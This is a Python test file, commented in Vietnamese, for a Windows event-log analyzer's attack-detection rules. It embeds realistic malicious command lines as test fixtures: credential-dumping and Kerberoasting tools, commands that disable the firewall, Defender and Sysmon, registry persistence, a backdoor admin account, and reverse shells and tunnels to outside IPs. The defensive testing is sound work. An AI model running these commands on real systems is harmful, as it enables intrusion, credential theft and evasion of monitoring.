"""
Test chữ ký công cụ tấn công / lạm dụng công cụ hệ thống (thêm 20/11/2026) và chuẩn hoá dòng lệnh.
Câu lệnh viết theo kiểu log thật (đường dẫn đầy đủ, ngoặc kép, viết hoa), KHÔNG chép từ data_benchmark,
để luật bắt theo kỹ thuật chứ không học thuộc câu lệnh của bộ đánh giá.
Không gọi Ollama. Chạy: .venv\\Scripts\\python.exe -m unittest discover -s tests
"""
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "core"))

import json  # noqa: E402

from analyze import correlate_security_events, is_benign_noise, read_events  # noqa: E402


def normal_case_findings(data_dir: Path):
    for mf in sorted(data_dir.glob("**/manifest.json")):
        if json.loads(mf.read_text(encoding="utf-8-sig")).get("ground_truth") != "NORMAL":
            continue
        events = read_events(mf.parent)
        yield mf.parent.name, correlate_security_events([e for e in events if not is_benign_noise(e)] or events)


def proc(cmd, ref="E0001"):
    return {"event_id": 4688, "event_ref": ref, "time": "2026-11-20T08:00:00.0000000Z", "data": {"CommandLine": cmd}}


def script(text, ref="E0002"):
    return {"event_id": 4104, "event_ref": ref, "time": "2026-11-20T08:00:00.0000000Z", "data": {"ScriptBlockText": text}}


def strong(*events):
    return correlate_security_events(list(events))["strong_stages"]


class CommandNormalizationTests(unittest.TestCase):
    def test_account_backdoor_with_full_path_and_exe(self):
        f = correlate_security_events([
            proc(r'"C:\Windows\system32\net.exe" user svc_backup Winter2026! /add', "E0001"),
            proc(r'C:\Windows\System32\net1.exe localgroup administrators svc_backup /add', "E0002"),
        ])
        self.assertIn("Backdoor Creation / Privilege Escalation (MITRE T1136 / T1098)", f["strong_stages"])

    def test_plain_account_creation_stays_weak(self):
        f = correlate_security_events([proc(r'"C:\Windows\system32\net.exe" user nv.an Welcome1 /add')])
        self.assertIn("Account Creation Command (MITRE T1136)", f["stages"])
        self.assertEqual([], f["strong_stages"])


class AttackToolSignatureTests(unittest.TestCase):
    def test_detected(self):
        cases = {
            "rubeus": proc(r"C:\Users\bob\Downloads\Rubeus.exe kerberoast /outfile:hashes.txt"),
            "rubeus ptt": proc(r"Rubeus.exe ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEpzCCBKNhggSf"),
            "lazagne": proc(r"C:\Temp\lazagne.exe browsers"),
            "pwdump": proc(r"C:\Temp\PwDump8.exe"),
            "secretsdump": proc(r"python secretsdump.py -sam sam.save -system system.save LOCAL"),
            "kerberoast ps": script("$t = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/sql01'"),
            "sharphound": proc(r"C:\Users\Public\SharpHound.exe -c All --zipfilename out.zip"),
            "powerview": script("Get-DomainUser -SPN | Select samaccountname,serviceprincipalname"),
            "seatbelt": proc(r"Seatbelt.exe -group=system"),
            "winpeas": proc(r"C:\Users\bob\AppData\Local\Temp\winPEASx64.exe"),
            "powerup": script("Import-Module .\\PowerUp.ps1; Invoke-AllChecks"),
            "portscan": script("Invoke-Portscan -Hosts 10.0.0.0/24 -Ports 22,445,3389"),
            "printnightmare": script("Invoke-Nightmare -NewUser 'adm1n' -NewPassword 'P@ss'"),
            "firewall off": proc(r'"C:\Windows\system32\netsh.exe" advfirewall set currentprofile state off'),
            "firewall opmode": proc(r"netsh firewall set opmode mode=disable"),
            "sysmon unload": proc(r"C:\Windows\system32\fltMC.exe unload SysmonDrv"),
            "defender svc": proc(r'sc.exe config WinDefend start= disabled'),
            "bcdedit": proc(r"bcdedit.exe /set {current} recoveryenabled no"),
            "usn journal": proc(r"fsutil usn deletejournal /d c:"),
            "hide exe": proc(r"attrib +s +h C:\ProgramData\updater.exe"),
            "takeown sethc": proc(r"takeown /f C:\Windows\System32\sethc.exe"),
            "icacls deny": proc(r'icacls "C:\ProgramData\agent.exe" /deny SYSTEM:(F)'),
            "schtasks temp": proc(r'schtasks /create /sc minute /mo 5 /tn "Updater" /tr "C:\Windows\Temp\upd.exe"'),
            "schtasks nc": proc(r'schtasks /create /sc onstart /tn x /tr "ncat.exe 203.0.113.9 443 -e cmd.exe" /ru SYSTEM'),
            "appcertdlls": proc(r'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls" /v x /d C:\x.dll'),
            "appinit": proc(r'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /d C:\x.dll'),
            "com hijack": proc(r'reg add "HKCU\Software\Classes\CLSID\{0358B920-0AC7-461F-98F4-58E32CD89148}\InProcServer32" /ve /d C:\x.dll'),
            "eventvwr uac": proc(r'reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "cmd.exe" /f'),
            "shim": proc(r"sdbinst.exe -q C:\Windows\Temp\patch.sdb"),
            "reverse shell": script("$client = New-Object System.Net.Sockets.TCPClient('203.0.113.5',443);$stream = $client.GetStream();"
                                    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$out = (iex $data 2>&1 | Out-String)}"),
            "plink reverse": proc(r"plink.exe -ssh -R 8080:127.0.0.1:3389 user@198.51.100.7 -pw x"),
            "chisel": proc(r"C:\Users\Public\chisel.exe client 198.51.100.7:8000 R:socks"),
            "rundll32 public": proc(r"rundll32.exe C:\Users\Public\update.dll,DllMain"),
        }
        missed = [name for name, e in cases.items() if not strong(e)]
        self.assertEqual([], missed)

    def test_admin_commands_not_strong(self):
        benign = {
            "net user query": proc(r"net user administrator"),
            "firewall show": proc(r"netsh advfirewall show allprofiles"),
            "firewall rule": proc(r'netsh advfirewall firewall add rule name="App" dir=in action=allow program="C:\Program Files\App\app.exe"'),
            "bcdedit enum": proc(r"bcdedit /enum"),
            "fltmc list": proc(r"fltmc filters"),
            "attrib ini": proc(r"attrib +h +s C:\Users\bob\Desktop\desktop.ini"),
            "icacls grant": proc(r'icacls "D:\Share" /grant "CORP\Staff":(OI)(CI)M'),
            "takeown data": proc(r"takeown /f D:\OldProfile /r /d y"),
            "schtasks vendor": proc(r'schtasks /create /tn "GoogleUpdate" /tr "\"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe\" /ua" /sc daily'),
            "reg run vendor": proc(r'reg query "HKCU\Software\Classes\CLSID"'),
            "ssh forward": proc(r"ssh -L 5432:localhost:5432 dev@db.corp.local"),
            "rundll32 shell": proc(r"rundll32.exe shell32.dll,Control_RunDLL desk.cpl"),
            "rundll32 printui": proc(r"rundll32 printui.dll,PrintUIEntry /in /n \\print01\HP"),
            "sc query": proc(r"sc query WinDefend"),
            "sc config svc": proc(r"sc config Spooler start= disabled"),
            "tcp test": script("Test-NetConnection -ComputerName web01 -Port 443"),
            "ad module": script("Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties ServicePrincipalName"),
        }
        hits = {name: strong(e) for name, e in benign.items() if strong(e)}
        self.assertEqual({}, hits)


class BenignCorpusTests(unittest.TestCase):
    """Luật MẠNH không được bắn trên ca NORMAL của mọi bộ dữ liệu có sẵn (log tự sinh + log nền thu từ máy)."""

    def test_no_strong_rule_on_normal_cases(self):
        fp = []
        for name in ("data01", "data100", "data_normal_heavy", "data_benchmark"):
            for case_id, findings in normal_case_findings(ROOT / name):
                if findings["strong_stages"]:
                    fp.append((name, case_id, findings["strong_stages"]))
        self.assertEqual([], fp)


if __name__ == "__main__":
    unittest.main()
